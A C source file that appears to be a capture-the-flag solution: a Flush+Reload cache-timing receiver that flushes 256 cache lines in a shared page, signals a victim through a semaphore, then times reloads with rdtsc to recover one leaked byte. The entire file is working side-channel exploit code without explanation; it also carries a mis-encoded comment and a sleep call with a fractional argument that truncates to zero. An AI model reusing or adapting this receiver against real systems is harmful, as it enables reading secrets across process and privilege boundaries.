#define _GNU_SOURCE
#include <sched.h>
#include <semaphore.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <x86intrin.h>
#include <string.h>
#define base 0x1337000
unsigned long long ans[256];
void prework()
{
	memset((void *)(base+0x1000),0,0x100000);
	for (int i=0;i<256;i++)
	{
		_mm_clflush((void *)(base+0x1000*(i+1)));
	}
}
int main() {
	sleep(0.5);
    sem_t *sem = (sem_t *)0x1337000;   // ÐÅºÅÁ¿
    int *index=(int*)(sem+1),cpuid=1;
    int fd=open("c",6);
    read(fd,index,1);
    read(fd,&cpuid,1);
    cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpuid,&set);
	sched_setaffinity(0, sizeof(set), &set);
    printf("Index is:%d,cpuid is:%d",*index,cpuid);
    prework();
    sem_post(sem);

    unsigned long long t=0;int id=0;
    for (int i=0;i<256;i++)
    {
    	int j=(i*167+13)&0xFF;
    	unsigned long long start=__rdtsc();
    	volatile unsigned long long x=*(volatile unsigned long long *)(base+0x1000*(j+1));
    	_mm_mfence();
    	unsigned long long end=__rdtsc();
   		ans[j]=end-start;
    	if (id==0||ans[j]<t)
    	{
    		t=ans[j];id=j;
		}
	}
	printf("Answer is:%d\n",id);
    return 0;
}
